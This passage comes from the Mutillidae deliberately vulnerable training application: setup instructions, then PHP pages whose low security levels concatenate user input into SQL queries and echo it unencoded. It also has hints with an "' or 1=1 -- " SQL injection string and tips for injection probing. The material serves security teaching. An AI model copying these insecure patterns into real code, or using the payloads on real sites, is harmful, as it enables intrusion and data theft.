			folder. When you are done, the "mutillidae" folder will be inside the 
			"htdocs" folder of XAMMP. All the Mutillidae files are inside that 
			"mutillidae" fodler. Assuming Apache and MySQL are running, the user 
			can open a browser and immediately begin using Mutillidae at 
			http://localhost/mutillidae. Apache automatically serves "index.php"
			which is located in the mutillidae folder. 
	</div>
	<div style="margin:20px">	
		ii.	Download and install "XAMPP" or "XAMPP Lite" for Windows or Linux. If 
			installing on Windows, when the installation asks if you want to install
			Apache and MySQL as services, answer "YES". This allows both to run as 
			Windows services and be controlled via services.msc. Run services.msc
			by typing "services.msc" at the command line. 
			(Start - Run - services.msc - Enter) 
	</div>
	<div style="margin:20px">
		iii. Download Mutillidae
	</div>
	<div style="margin:20px">
		iv.	Unzip Mutillidae. Note the mutillidae project is in a folder called "mutillidae"
	</div>
	<div style="margin:20px">
		v.	Place the entire "mutillidae" directory into XAMPPs " htdocs" directory
	</div>
	<div style="margin:20px">
		vi.	Browse to mutillidae at http://localhost/mutillidae
	</div>
	<div style="margin:20px">
		vii.	Click the "Setup/reset the DB" link in the main menu.
	</div>
	<div style="margin:20px">
		viii.	Get rid of PHP "strict" errors. They are not compatible with the OWASP ESAPI 
		classes in use in Mutillidae 2.0. The error modifies headers disrupting functionality 
		so this is not simply an annoyance issue. To do this, go to the PHP.INI file  and change the line that reads 
		"error_reporting = E_ALL | E_STRICT" to "error_reporting = E_ALL & ~E_NOTICE & ~E_WARNING & ~E_DEPRECIATED". 
		Once the modification is complete, restart the Apache service. If you are not sure how to restart 
		the service, reboot.
	</div>
	<div style="margin:20px">
		Important note: If you use XAMPP Lite or various version of XAMPP on various operating systems, the path for your 
		php.ini file may vary. You may even have multiple php.ini files in which case try to modify the one in the Apache
		directory first, then the one in the PHP file if that doesnt do the trick.
	</div>
	<div style="margin:20px">
		Windows possible default location C:\xampp\php\php.ini, C:\XamppLite\PHP\php.ini, others
		Linux possible default locations: /XamppLite/PHP/php.ini, /XamppLite/apache/bin/php.ini, others 
	</div>
	<div style="margin:20px">
		ix.	By default, Mutillidae tries to connect to MySQL on the localhost with the username 
		"root" and a blank password. To change this, edit "config.inc" with the correct 
		information for your environment.
	</div>
	<div style="margin:20px">
		x.	NOTE: Once PHP 6.0 arrives in XAMPP, E_ALL will include E_STRICT so the line 
		to change will probably read "error_reporting = E_ALL". In any case, change 
		the error_reporting line to 
		"error_reporting = E_ALL & ~E_NOTICE & ~E_DEPRECIATED".
	</div>
	<div style="margin:20px">
		xi. NOTE: Be sure magic quotes is disabled. In XAMMP it seems to be but using MMAP for
		Apple OS/X seems to have it enabled by default. Just make sure magic quotes is set to 
		off in whatever framework is being used. This setting is in PHP.ini. This includes 
		magic_quotes_gpc, magic_quotes_runtime, and magic_quotes_sybase. 
	</div>		

	<span style="font-weight: bold;">c.	Custom Linux ISO</span>
	<div style="margin:20px">
		i.	Using the Samurai Web Testing Framework as the base operating system, any version of Mutillidae 
		can be installed in addition to the version which comes standard with Samurai. From this custom set-up, 
		a custom ISO can be generated using the Remastersys  package.
	</div>
	<div style="margin:20px">
		With Samurai 0.95, Mutillidae is installed into the /srv/mutillidae directory. To install different 
		versions of Mutillidae and make a custom Linux ISO, the following recipe can be followed:
	</div>
	<div style="margin:40px">
			1.	Locate the default installation of Mutillidae in the /srv/mutillidae directory.<br />
			2.	Rename the current installation. For example rename the "mutillidae" folder to "mutillidae-1.5".<br />
			3.	Download the latest version from www.irongeek.com<br />
			4.	Unzip the "mutillidae" folder from the latest version to the /srv directory.<br />
			5.	Test that mutillidae is updated by browsing to http://localhost/mutillidae<br />
			6.	Test that the original version of mutillidae still works browsing to http://localhost/mutillidae-1.5<br /> 
			7.	Make any changes to Linux, Firefox, or other software desired. For example, the lab environment <br />
				created for the U of L information security course used an updated version of Firefox with several add-ons.<br />
			8.	Ensure the current Remastersys installation is clean by running the command "sudo remastersys clean"<br />
			9.	When ready to create the new ISO, run the command "sudo remastersys backup"<br />
			10.	The custom ISO will be found in the /home/remastersys/remastersys directory<br />
	</div>
	
	<span style="font-weight: bold;">d.	Virtual Machine</span>
	<div style="margin:40px">
		i.	Mutillidae has been tested in a Virtual Box  and VMware Workstation  virtual machines running 
		Windows XP SP3 and Ubuntu. Additionally, Virtual Box virtual machines have been booted from the 
		Samurai 0.95 WTF DVD and the Samurai 0.95/Mutillidae 2.x Custom ISO. The Windows XP SP3 
		installation ran Mutillidae 2.x in the XAMPP environment. The Ubuntu installation was 
		created by installing the Samurai 0.95 WTF to a Linux virtual machine. Basically any of the 
		previously mentioned installation options work equally well in virtual environments.
	</div>
</div><?php 
	try {	    	
    	switch ($_SESSION["security-level"]){
    		case "0": // This code is insecure.
				$lEnableJavaScriptValidation = FALSE;
    		break;

    		case "1": // This code is insecure.
				$lEnableJavaScriptValidation = TRUE;
    		break;

	   		case "2":
	   		case "3":
	   		case "4":
    		case "5": // This code is fairly secure
    			$lEnableJavaScriptValidation = TRUE;
    		break;
    	}// end switch
	} catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error setting up configuration.");
	}// end try	
?>

<script type="text/javascript">
<!--
	<?php 
		if ($_SESSION["loggedin"]=="True") {
			echo "var l_loggedIn = true;" . PHP_EOL;
		}else {
			echo "var l_loggedIn = false;" . PHP_EOL;
		}// end if
	
		if (isset($failedloginflag)){
			echo 'var l_failedLogInFlag = "'.$failedloginflag.'";' . PHP_EOL;
		}else{
			echo 'var l_failedLogInFlag = "0";'.PHP_EOL;
		}// end if
 
		if($lEnableJavaScriptValidation){
			echo "var lValidateInput = \"TRUE\"" . PHP_EOL;
		}else{
			echo "var lValidateInput = \"FALSE\"" . PHP_EOL;
		}// end if		
	?>

	function onSubmitOfLoginForm(/*HTMLFormElement*/ theForm){
		try{
			var lUnsafeCharacters = /[`~!@#$%^&*()-_=+\[\]{}\\|;':",./<>?]/;

			if(lValidateInput == "TRUE"){
				if (theForm.username.value.length > 15 || 
					theForm.password.value.length > 15){
						alert('Username too long. We dont want to allow too many characters.\n\nSomeone might have enough room to enter a hack attempt.');
						return false;
				}// end if
				
				if (theForm.username.value.search(lUnsafeCharacters) > -1 || 
					theForm.password.value.search(lUnsafeCharacters) > -1){
						alert('Dangerous characters detected. We can\'t allow these. This all powerful blacklist will stop such attempts.\n\nMuch like padlocks, filtering cannot be defeated.\n\nBlacklisting is l33t like l33tspeak.');
						return false;
				}// end if
			}// end if(lValidateInput)
			
			return true;
		}catch(e){
			alert("Error: " + e.message);
		}// end catch
	}// end function onSubmitOfLoginForm(/*HTMLFormElement*/ theForm)
//-->
</script>

<div class="page-title">Login</div>

<?php include_once './includes/back-button.inc';?>

<div id="id-log-in-form-div" style="display: none; text-align:center;">
	<form 	action="index.php?page=login.php" 
			method="post" 
			enctype="application/x-www-form-urlencoded" 
			onsubmit="return onSubmitOfLoginForm(this);"
			id="idLoginForm">
		<table style="margin-left:auto; margin-right:auto;">
			<tr id="id-bad-cred-tr" style="display: none;">
				<td colspan="2" class="error-message">
					Authentication Error: Bad user name or password
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td colspan="2" class="form-header">Please sign-in</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td class="label">Name</td>
				<td><input type="text" name="username" maxlength="20" size="20"></td>
			</tr>
			<tr>
				<td class="label">Password</td>
				<td><input type="password" name="password" maxlength="20" size="20"></td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td colspan="2" style="text-align:center;">
					<input name="login-php-submit-button" class="button" type="submit" value="Login" />
				</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td colspan="2" style="text-align:center; font-style: italic;">
					Dont have an account? <a href="?page=register.php">Please register here</a>
				</td>
			</tr>
		</table>
	</form>
</div>

<div id="id-log-out-div" style="text-align: center; display: none;">
	<table align="center">
		<tr>
			<td colspan="2" class="hint-header">You are logged in as <?php echo $_SESSION['logged_in_user']; ?></td>
		</tr>
		<tr><td></td></tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input class="button" type="button" value="Logout" onclick="document.location='index.php?do=logout'" />
			</td>
		</tr>
	</table>	
</div>

<script type="text/javascript">
	if(l_failedLogInFlag=="1"){
		document.getElementById("id-bad-cred-tr").style.display="";
	}// end if l_failedLogInFlag

	if (!l_loggedIn){
		document.getElementById("id-log-in-form-div").style.display="";
		document.getElementById("id-log-out-div").style.display="none";
	}else{
		document.getElementById("id-log-in-form-div").style.display="none";
		document.getElementById("id-log-out-div").style.display="";		
	}// end if l_loggedIn	
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For SSL Injection:</b>The old "\' or 1=1 -- " is a classic, but there are others. Check out who 
								you are logged in as after you do the injection.
							</li>
						  	<li><b>For Session and Authentication:</b>As for playing with sessions, try a 
								<a href="https://addons.mozilla.org/en-US/firefox/addon/4510">cookie editor</a> 
								to change your UID.
							</li>
							<li><b>For Insecure Authentication:</b>Try sniffing the traffic with Wireshark, Cain, Dsniff or Ettercap.</li>
							<li>Some code contains naive protections such as limiting the width of HTML fields. 
								If your If you find that you need more room, try using a tool like Firebug to 
								change the size of the field to be as long as you like. As you advance, 
								try using tools like netcat to make your own POST requests without having 
								to use the login web page at all.
							</li>
							<li>You can use the login page normally but then simply change the parameters is Tamper Data. 
							Because Tamper Data is allowing the user to manipulate the request after the request has 
							left the browser, any HTML or JavaScript has already run and is completely useless as a 
							security measure. Any use of HTML or JavaScript for security purposes is useless anyway. 
							Some developers still fail to recognize this fact to this day.
							</li>
							<li>
							Try SQL injection probing by entering single-quotes, double-quotes, 
							paranthesis, double-dash (--), hyphen-asterik (/*), and 
							closing-parenthesis-hyphen-hyphen ()--)
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
	// End hints section

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/sql-injection-tutorial.inc';
	}// end if
	if ($_SESSION["showhints"] == 2) {
		include_once './includes/insufficient-transport-layer-protection.inc';
	}// end if	
?>

<script type="text/javascript">
	try{
		document.getElementById("idLoginForm").username.focus();
	}catch(e){
		alert('Error trying to set focus on field idLoginForm: ' + e.message);
	}// end try
</script>
<?php 
	 /* Known Vulnerabilities
	 * 
	 * SQL Injection, (Fix: Use Schematized Stored Procedures)
	 * Cross Site Scripting, (Fix: Encode all output)
	 * Cross Site Request Forgery, (Fix: Tokenize transactions)
	 * Denial of Service, (Fix: Truncate Log Queries)
	 * Improper Error Handling, (Fix: Employ custom error handler)
	 * SQL Exception, (Fix: Employ custom error handler)
	 */
	try {
		$LogHandler->writeToLog($conn, "User visited");	
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try
			
?><div class="page-title">Usage Instructions</div>

<?php include_once './includes/back-button.inc';?>

<ul>
	<li>Created by <a href="http://Irongeek.com">Irongeek.com</a>.</li>
	<li>If you would like to learn about other deliberately vulnerable web 
		applications, check out <a href="http://www.irongeek.com/i.php?page=security/deliberately-insecure-web-applications-for-learning-web-app-security">
		Deliberately Insecure Web Applications For Learning Web App Security</a>. 
	</li>
	<li>If you would like to help in writing the hints sections, please
		<a href="http://www.irongeek.com/i.php?page=contact">email</a>. Your name 
		and a link to your site will be added to the credits page.
	</li>
	<li><u><font color="#FF0000">Do NOT&nbsp; run this code on a production network</font></u>. Either run it on a 
	private network, or restrict your web server software to only use the local 
	loopback address. By default Mutillidae only allows access from localhost 
	(127.*.*.*). Edit the .htaccess file to change this behavior (not recommended on a public network). 
	If for some reason .htaccess is not parsed you can 
	restrict the IP by finding the &quot;Listen&quot; line in the http.conf file and changing 
	it to read: <font color="#008080">Listen 127.0.0.1:80</font>
	</li>
</ul>
<?php 
	try{	
		$conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
		if (!$conn) {
   		   	throw (new Exception("Error connecting to MySQL database. Connection error: ".$conn->connect_errorno." - ".$conn->connect_error." Error: ".$conn->errorno." - ".$conn->error, $conn->errorno));
	    }// end if
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error attempting to open MySQL connection.");
	}// end try		
?><div class="page-title">Page Not Found</div>

<?php include_once './includes/back-button.inc';?>

<table style="margin-left:auto; margin-right:auto;">
	<tr id="id-bad-page-tr">
		<td colspan="2" class="error-message">
			Validation Error: 404 - Page Not Found
		</td>
	</tr>
</table><?php
	try {	    	
    	switch ($_SESSION["security-level"]){
	    		case "0": // This code is insecure.
	    		case "1": // This code is insecure.
					// Grab inputs insecurely. $_REQUEST allows any input paramter. Not just POST.
					$lUsernameForJS = $_REQUEST["username"]; // allow javascript and xss injection
	    		break;

	    		case "2":
	    		case "3":
	    		case "4":
	    		case "5": // This code is fairly secure
					/* Protect against one form of patameter pollution 
					 * by grabbing inputs only from GET parameters. */ 
					$lUsernameForJS = $Encoder->encodeForJavaScript($_GET["username"]);
	    		break;
	    	}// end switch
	    	
	    	$lPasswordJSMessage = "This password is for {$lUsernameForJS}";
	    	
    	} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, "Input: " . $lUsernameForHTML);
    	}// end try
?>

<script>
	function onSubmitOfGeneratorForm(/*HTMLFormElement*/ theForm){
		try{

		    var lPasswordText = "";
		    var lPasswordCharset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_-+=[]{}\|;',./:?";

		    for( var i=0; i < 15; i++ ){
		    	lPasswordText += lPasswordCharset.charAt(Math.floor(Math.random() * lPasswordCharset.length));
		    }// end for i
			
			document.getElementById("idPasswordInput").innerHTML = "Password: <span style=\"color:red;border-width:1px;border-color:black;\">" + lPasswordText + "</span>";
			document.getElementById("idPasswordTableRow").style.display = "";
			return false;

		}catch(e){
			alert("Error: " + e.message);
		}// end catch
	}// end function onSubmitOfGeneratorForm(/*HTMLFormElement*/ theForm)
</script>

<div class="page-title">Password Generator</div>

<?php include_once './includes/back-button.inc';?>

<div id="id-generator-form-div">
	<form 	enctype="application/x-www-form-urlencoded" 
			id="idGeneratorForm">
		<table style="margin-left:auto; margin-right:auto;">
			<tr>
				<td class="form-header">Password Generator</td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td class="label"  style="text-align: center;">
					Making strong passwords is important.
					<br/>
					Click the button below to generate a password.
				</td>
			</tr>
			<tr><td></td></tr>
			<tr style="text-align: center;">
				<td class="label" id="idUsernameInput"></td>
			</tr>
			<tr id="idPasswordTableRow" style="display: none;">
				<td class="label" id="idPasswordInput"></td>
			</tr>
			<tr><td></td></tr>
			<tr>
				<td style="text-align:center;">
					<input name="password-generator-php-submit-button" class="button" type="button" value="Generate" onclick="onSubmitOfGeneratorForm(this.form);" />
				</td>
			</tr>
			<tr><td></td></tr>
		</table>
	</form>
</div>

<script>
	try{
		document.getElementById("idUsernameInput").innerHTML = "<?php echo $lPasswordJSMessage; ?>";
	}catch(e){
		alert("Error: " + e.message);
	}// end catch
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li>
							  	<b>JavaScript Injection:</b>JS injection is closely related to HTML injection and 
							  	Cross Site Scripting. All are a violation of context in which the input is able
							  	to break out of the current context and switch to another context. Alternatively
							  	an injection may stay in the current context but modify the source code.
							</li>
						  	<li>
							  	An example of breaking context is injecting script tags into HTML output. The developer
							  	believes the context should be HTML (perhaps a table), but the input of 
							  	script tags (with embedded script) causes the browser to stop processing HTML
							  	and switch to processing script. The context switch occurs when the browser 
							  	stops executing the HTML instructions and instead executes the JS.
							</li>
							<li>
								Injection within context could be injecting HTML into HTML output. Although
								the page source code is altered, the context remains the same.
							</li>
							<li>
								The defect on this page which allows JS injection does not break out of context.
							</li>
							<li>
								The JS that builds the password is a diversion. The injection point is elsewhere.
							</li>
							<li>
								To find the injection, you need a canary. First, identify the input. Does this page 
								take input from a form, URL parameter, cookie, or other input? HTTPFox is a good tool
								to see all the input as you "GET" a page (the request) and all the output the server 
								responds with (the response). 
							</li>
							<li>
								Once you find the page input, try injecting a simple canary like "CANARY-INPUT-1"
								then search the resulting page to see where the canary showed up. 
							</li>
							<li>
								Searching for a canary on the actual browser output is not a good idea. Use the browsers
								"view source" to see the "real" response. Tools like HTTPFox are great for this as well.
								Tools with more features like Burp are even better but have more of a learning curve.
								Burp will remember the source of each page you visit as you spider the site.
							</li>
							<li>
								Once the canary(ies) is located, identify what characters need to be injected to 
								"end" the current instruction. Identify the characters that are needed to block out
								any instruction that comes after the canary. Put your injection in the middle.
							</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
	// End hints section
?><?php 
	try {	    	
    	switch ($_SESSION["security-level"]){
    		case "0": // This code is insecure.
    			$lUseJavaScriptValidation = FALSE;
    			$lUseServerSideValidation = FALSE;
   				$lEncodeOutput = FALSE;
				$lTokenizeAllowedMarkup = FALSE;
				$lProtectAgainstSQLInjection = FALSE;
				$lProtectAgainstGETforPOST = FALSE;	
			break;

    		case "1": // This code is insecure.
    			$lUseJavaScriptValidation = TRUE;
    			$lUseServerSideValidation = FALSE;
				$lEncodeOutput = FALSE;
				$lTokenizeAllowedMarkup = FALSE;
				$lProtectAgainstSQLInjection = FALSE;
				$lProtectAgainstGETforPOST = FALSE;    		
			break;

	   		case "2":
	   		case "3":
	   		case "4":
    		case "5": // This code is fairly secure
    			$lUseJavaScriptValidation = TRUE;
    			$lUseServerSideValidation = TRUE;
    			$lProtectAgainstGETforPOST = TRUE;
	  			/* 
	  			 * NOTE: Input validation is excellent but not enough. The output must be
	  			 * encoded per context. For example, if output is placed in HTML,
	  			 * then HTML encode it. Blacklisting is a losing proposition. You 
	  			 * cannot blacklist everything. The business requirements will usually
	  			 * require allowing dangerous charaters. In the example here, we can 
	  			 * validate username but we have to allow special characters in passwords
	  			 * least we force weak passwords. We cannot validate the signature hardly 
	  			 * at all. The business requirements for text fields will demand most
	  			 * characters. Output encoding is the answer. Validate what you can, encode it
	  			 * all.
	  			 */
	   			// encode the output following OWASP standards
	   			// this will be HTML encoding because we are outputting data into HTML
				$lEncodeOutput = TRUE;
				
				/* Business Problem: Sometimes the business requirements define that users
				 * should be allowed to use some HTML  markup. If unneccesary, this is a
				 * bad idea. Output encoding will naturally kill any users attempt to use HTML
				 * in their input, which is exactly why we use output encoding. 
				 * 
				 * If the business process allows some HTML, then those HTML items are elevated
				 * from "mallicious input" to "direct object refernces" (a resource to be enjoyed).
				 * When we want to restrict a user to using to "direct object refernces" (a 
				 * resource to be enjoyed) responsibly, we use mapping. Mapping allows the user
				 * to chose from a "system generated" (that's us programmers) set of tokens
				 * to pick from. We need to assure that the user either chooses one of the tokens
				 * we offer, or our system rejects the request. To put it bluntly, either the user
				 * follows the rules, or their output is encoded. Period.
				 */
				$lTokenizeAllowedMarkup = TRUE;
				
				/* If we are in secure mode, we need to protect against SQLi */
				$lProtectAgainstSQLInjection = TRUE;
    		break;
    	}// end switch
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error setting up configuration on page pentest-lookup-tool.php");
	}// end try	

	//--------------------------------------------
	//Get the tools to populate the drop down box
	//--------------------------------------------
	try {
		$query  = "SELECT tool_id, tool_name FROM pen_test_tools;";
		$qPenTestToolOptions = $conn->query($query);
		if (!$qPenTestToolOptions) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if   
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try
	
	//--------------------------------------------------------
	//If the user selected a tool, get the data for that tool
	//--------------------------------------------------------
	try {
		if ($lProtectAgainstGETforPOST) {
			$lPostedButton = $_POST["pen-test-tool-lookup-php-submit-button"];
			$lPostedToolID = $_POST["ToolID"];
		}else{
			$lPostedButton = $_REQUEST["pen-test-tool-lookup-php-submit-button"];
			$lPostedToolID = $_REQUEST["ToolID"];
		}//end if

		if(!empty($lPostedButton)){
			
			if ($lProtectAgainstSQLInjection) {
				$lPostedToolID = real_escape_string($lPostedToolID);
			}//end if		
			
			if ($lPostedToolID == "0923ac83-8b50-4eda-ad81-f1aac6168c5c" || strlen($lPostedToolID) == 0){
				$lErrorNoChoiceMade = TRUE;
			}else{
				$lErrorNoChoiceMade = FALSE;
				
				if ($lPostedToolID != "c84326e4-7487-41d3-91fd-88280828c756"){
					$lWhereClause = " WHERE tool_id = '".$lPostedToolID."';";
				}else{
					$lWhereClause = ";";
				}// end if
				
				$query  = "SELECT tool_id, tool_name, phase_to_use, tool_type, comment 
						   FROM pen_test_tools" . 
						   $lWhereClause;

				$qPenTestToolResults = $conn->query($query);
				if (!$qPenTestToolResults) {
			    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
			    }// end if there are no results

				try {
					$lPenTestToolsDetails = "";
					$lPenTestToolsJSON = 
						'{"query": {"toolIDRequested": "'.$lPostedToolID.'", "penTestTools": [';
					if($qPenTestToolResults->num_rows > 0){
						while($row = $qPenTestToolResults->fetch_object()){
							$lPenTestToolsDetails .= json_encode($row) . ",";
						}// end while
						$lPenTestToolsJSON .= substr($lPenTestToolsDetails, 0, strlen($lPenTestToolsDetails)-1);
					}//end if
					$lPenTestToolsJSON .= ']}}';
					
					//print $lPenTestToolsJSON;
				} catch (Exception $e) {
    				throw (new Exception('Error working with query results: '.$conn->error, $conn->errorno));
				}// end try			    
			    
			}// end if user didnt pick anything
			
		}// end if user didnt click submit
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
	}// end try	
?>

<div class="page-title">Pen Test Tool Lookup</div>

<?php include_once './includes/back-button.inc';?>

<!-- BEGIN HTML OUTPUT  -->
<script type="text/javascript">
	
	<?php 
		if ($lUseJavaScriptValidation){
			echo "var gUseJavaScriptValidation = \"TRUE\";".PHP_EOL;
		}else{
			echo "var gUseJavaScriptValidation = \"FALSE\";".PHP_EOL;
		}//end if		

		if ($lErrorNoChoiceMade){
			echo "var gDisplayError = \"TRUE\";".PHP_EOL;
		}else{
			echo "var gDisplayError = \"FALSE\";".PHP_EOL;
		}//end if
		
		echo 'try{
				var gPenTestToolsJSON = ( ' . $lPenTestToolsJSON . ' );
			}catch(e){
				alert("Error trying to evaluate JSON: " + e.message);
			};' . PHP_EOL . PHP_EOL;
		//echo "alert(gPenTestToolsJSON);" . PHP_EOL . PHP_EOL;
	?>
	
	var addRow = function(pRowOfData){
		try{
			var lDocRoot = window.document;
			var lTBody = lDocRoot.getElementById("idDisplayTableBody");
			var lTR = lDocRoot.createElement("tr");

			//tool_id, tool_name, phase_to_use, tool_type, comment

			var lToolIDTD = lDocRoot.createElement("td");
			var lToolNameTD = lDocRoot.createElement("td");
			var lPhaseTD = lDocRoot.createElement("td");			
			var lToolTypeTD = lDocRoot.createElement("td");
			var lCommentTD = lDocRoot.createElement("td");

			//lKeyTD.addAttribute("class", "label");
			lToolIDTD.setAttribute("class","sub-body");
			lToolNameTD.setAttribute("class","sub-body");
			lToolNameTD.setAttribute("style","color:#770000");
			lPhaseTD.setAttribute("class","sub-body");
			lToolTypeTD.setAttribute("class","sub-body");
			lCommentTD.setAttribute("class","sub-body");
			lCommentTD.setAttribute("style","font-weight: normal");
			
			lToolIDTD.appendChild(lDocRoot.createTextNode(pRowOfData.tool_id));
			lToolNameTD.appendChild(lDocRoot.createTextNode(pRowOfData.tool_name));
			lPhaseTD.appendChild(lDocRoot.createTextNode(pRowOfData.phase_to_use));
			lToolTypeTD.appendChild(lDocRoot.createTextNode(pRowOfData.tool_type));
			lCommentTD.appendChild(lDocRoot.createTextNode(pRowOfData.comment));
			
			lTR.appendChild(lToolIDTD);
			lTR.appendChild(lToolNameTD);
			lTR.appendChild(lPhaseTD);
			lTR.appendChild(lToolTypeTD);
			lTR.appendChild(lCommentTD);
			
			lTBody.appendChild(lTR);
		}catch(/*Exception*/ e){
			alert("Error trying to add row in function addRow(): " + e.name + "-" + e.message);
		}// end try
	};//end JavaScript function addRow

	var initializePage = function(){
		try{
			document.getElementById("idToolSelect").focus();
		}catch(/*Exception*/ e){
			alert("Error trying to initialize page: " + e.message);
		}// end try
	};// end function
	
	var displayError = function(){
		try{
			if(gDisplayError == "TRUE"){
				document.getElementById("id-invalid-input-tr").style.display="";
			}// end if		
		}catch(/*Exception*/ e){
			alert("Error trying to display error: " + e.message);
		}// end try
	};// end function
	
	var displayPenTestTools = function(){
		try{
			var laTools = gPenTestToolsJSON.query.penTestTools;
			if(laTools && laTools.length > 0){
				document.getElementById("idDisplayTable").style.display="";
				for (var i=0; i<laTools.length; i++){
					addRow(laTools[i]);
				}//end for i
			}// end if
		}catch(/*Exception*/ e){
			alert("Error trying to parse JSON: " + e.message);
		}// end try
	};// end function
</script>

<fieldset style="width: 500px;">
	<legend>Pen Test Tools</legend>
	<form 	action="index.php?page=pen-test-tool-lookup.php" 
			method="post" 
			enctype="application/x-www-form-urlencoded" 
			onsubmit=""
			id="idForm">
		<table>
			<tr id="id-invalid-input-tr" style="display: none;">
				<td class="error-message" colspan="2">
					Error: Invalid Input - Please choose a tool to lookup.
				</td>
			</tr>
			<tr><td>&nbsp;</td></tr>
			<tr>
				<td class="form-header" colspan="2">Select Pen Test Tool</td>
			</tr>
			<tr><td>&nbsp;</td></tr>
			<tr>
				<td class="label" style="text-align: right;">Pen Test Tool</td>
				<td>
					<select name="ToolID" id="idToolSelect">
						<option value="0923ac83-8b50-4eda-ad81-f1aac6168c5c" selected="selected">Please Choose Tool</option>
						<option value="c84326e4-7487-41d3-91fd-88280828c756">Show All</option>
						<?php
							try {
							    while($result = $qPenTestToolOptions->fetch_object()){

									if(!$lEncodeOutput){
										$lToolID = $result->tool_id;
										$lToolName = $result->tool_name;
									}else{
										$lToolID = $Encoder->encodeForHTML($result->tool_id);
										$lToolName = $Encoder->encodeForHTML($result->tool_name);
									}// end if

								    echo '<option value="' . $lToolID . '">' . $lToolName . '</option>' . PHP_EOL;
									
								}// end while
							} catch (Exception $e) {
								echo $CustomErrorHandler->FormatError($e, $query);
							}// end try		
						?>
					</select>
				</td>
			</tr>
			<tr><td>&nbsp;</td></tr>
			<tr>
				<td colspan="2" style="text-align: center;">
					<input name="pen-test-tool-lookup-php-submit-button" type="submit" value="Lookup Tool" class="button" />
				</td>
			</tr>
		</table>
	</form>
</fieldset>

<table id="idDisplayTable" style="display:none;">
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td class="sub-header" colspan="5">Pen Testing Tools</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td class="sub-header">Tool ID</td>
		<td class="sub-header">Tool Name</td>
		<td class="sub-header">Tool Type</td>
		<td class="sub-header">Phase Used</td>
		<td class="sub-header">Comments</td>
	</tr>
	<tbody id="idDisplayTableBody" style="font-weight:bold;"></tbody>
	<tr><td>&nbsp;</td></tr>
</table>

<script type="text/javascript">
<!--
	initializePage();
	displayError();
	displayPenTestTools();
//-->
</script>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<div>&nbsp;</div>
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
			<br/>
			<span class="report-header">Vulnerabilities</span>
			<br/><br/>
			This page is at least vulnerable to JSON injection, cross site scripting, 
			JavaScript injection, and SQL injection. See what you can do before going further.
			<br/><br/>
			<span class="report-header">JSON Injection: Finding Inputs</span>
			<br/><br/>
			JSON injection starts like any injection; find the possible input parameters including
			adding custom parameters (parameter addition attack) to see if the application will
			process them and place those inputs into the JSON returned by the server. (If we 
			cannot get our input into the JSON returned by the server, we cannot inject the JSON.)
			<br/><br/>
			Finding input parameters can be done using an ordinary Firefox browser. No special tools
			are required. This particular page has a drop down which is an input. Developers sometimes
			think that they control the web page. This of course is incorrect. The web page is running 
			in the users browser. The user can do anything they want like change the page using Firebug.
			If you dont like that drop-down, change it to an input box. Then you can type in whatever 
			you like. 
			<br/><br/>
			Inputs can be found more efficiently and more consistently using repeatable processes 
			executed with interception-proxies you are familiar with through practice. A simple,
			easy to use interception proxy is Tamper Data. It is a plugin for Firefox. It is quick
			but limited in ability. Still it is a great add-on for quick and dirty testing.
			<br/><br/>
			A better interception proxy is Burp-Suite. The free version is quite capible and the Pro
			version is worth every penny to a professional. The drawback to Burp is that the browser
			must be proxied to Burp and the tool has a learning curve. For new users, the concept
			of proxying the browser to another peice of software rather than just browsing to a site
			can be weird. You only have to learn once. The Proxy Selector add-on for Firefox can
			make switching between Burp and no proxy easier.
			<br/><br/>
			Browse to this page with Burp as the proxy. Look in the "Proxy" tab, then the "Intercept"
			sub-tab to see the raw request. If new, use the "Params" sub-sub-tab to aid in
			understanding the input parameters to the page. 
			<br/><br/>
			If we look at the capture by Burp, we can see some input areas. They are marked with the 
			funny symbols in this example capture.
			<br/>
<code>
POST /mutillidae/index.php?page=<span class="important-code">pen-test-tool-lookup.php</span> HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
DNT: 1
Proxy-Connection: keep-alive
Referer: http://localhost/mutillidae/index.php?page=pen-test-tool-lookup.php
Cookie: PHPSESSID=<span class="important-code">u0at2rs1d2m69m5qm2mtqsko22</span>
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

ToolID=<span class="important-code">7</span>&pen-test-tool-lookup-php-submit-button=<span class="important-code">Lookup+Tool</span>
</code>
						<br/>
